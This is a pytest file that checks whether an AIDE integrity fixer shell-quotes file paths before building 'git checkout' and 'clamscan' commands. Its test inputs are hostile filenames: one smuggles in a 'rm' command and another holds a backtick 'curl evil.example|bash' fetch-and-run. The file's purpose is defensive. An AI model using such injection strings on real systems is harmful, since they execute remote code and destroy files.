"""
Tests fuer Finding #561 — shlex.quote()-Haertung in aide_fixer.py

file_path stammt aus AIDE-Integrity-Events und kann durch Dateinamen auf dem
ueberwachten System beeinflusst sein. _restore_from_git() und _scan_file()
duerfen ihn nicht unescaped in ein Shell-Kommando interpolieren.
"""

import shlex
from unittest.mock import AsyncMock, MagicMock

import pytest

from src.integrations.fixers.aide_fixer import AideFixer


@pytest.fixture
def fixer():
    executor = MagicMock()
    executor.execute = AsyncMock(return_value=MagicMock(success=True, stdout=""))
    backup_manager = MagicMock()
    return AideFixer(executor=executor, backup_manager=backup_manager)


class TestRestoreFromGitQuoting:
    @pytest.mark.asyncio
    async def test_malicious_filename_is_quoted(self, fixer):
        # Kein zusaetzliches "/" im schaedlichen Teil, sonst veraendert
        # os.path.basename() den Testfall selbst.
        malicious_path = "/repo/foo; rm important_file.txt"

        await fixer._restore_from_git(malicious_path)

        called_command = fixer.executor.execute.call_args[0][0]
        expected_basename = shlex.quote("foo; rm important_file.txt")
        assert called_command == f"git checkout HEAD -- {expected_basename}"
        # Das Semikolon darf nicht unescaped (ausserhalb von Quotes) auftauchen
        assert "-- foo; rm" not in called_command

    @pytest.mark.asyncio
    async def test_normal_filename_still_works(self, fixer):
        await fixer._restore_from_git("/repo/config.yaml")

        called_command = fixer.executor.execute.call_args[0][0]
        assert "config.yaml" in called_command
        assert called_command.startswith("git checkout HEAD --")


class TestScanFileQuoting:
    @pytest.mark.asyncio
    async def test_malicious_filename_is_quoted(self, fixer):
        malicious_path = "/tmp/aide_quarantine/foo`curl evil.example|bash`"

        await fixer._scan_file(malicious_path)

        called_command = fixer.executor.execute.call_args[0][0]
        # Der Pfad muss shlex-gequotet sein (in Single-Quotes), damit die
        # Backticks NICHT als Command-Substitution durch die Shell interpretiert
        # werden koennen.
        assert called_command == f"clamscan --no-summary {shlex.quote(malicious_path)}"
        assert called_command.startswith("clamscan --no-summary '")

    @pytest.mark.asyncio
    async def test_normal_filename_still_works(self, fixer):
        await fixer._scan_file("/tmp/aide_quarantine/20260830_120000_file.txt")

        called_command = fixer.executor.execute.call_args[0][0]
        assert "20260830_120000_file.txt" in called_command
